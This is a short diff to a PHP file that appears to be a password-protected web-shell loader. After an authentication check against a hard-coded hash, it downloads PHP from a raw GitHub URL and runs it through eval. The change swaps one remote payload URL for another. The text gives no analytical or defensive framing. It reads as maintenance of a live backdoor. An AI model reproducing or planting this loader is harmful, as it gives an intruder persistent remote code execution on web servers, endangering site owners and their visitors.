@@ -1,4 +1,5 @@
 
+
 <?php
 $auth_pass = "2b2abc5a7d63b5489a546c7a520cd7b03e1f26ac67635b8df247501f8b5cb99a";
 
@@ -57,7 +58,7 @@ function is_logged_in() {
 
 if (is_logged_in()) {
  
-    $a = fetchRemoteContent('https://raw.githubusercontent.com/Seodigital3365/kasihpaham/refs/heads/main/cibaiii.php');
+    $a = fetchRemoteContent('https://raw.githubusercontent.com/kakigoyang/enter/refs/heads/main/rungkatbaca.php');
     if ($a !== false) {
         eval('?>' . $a);
     } else {
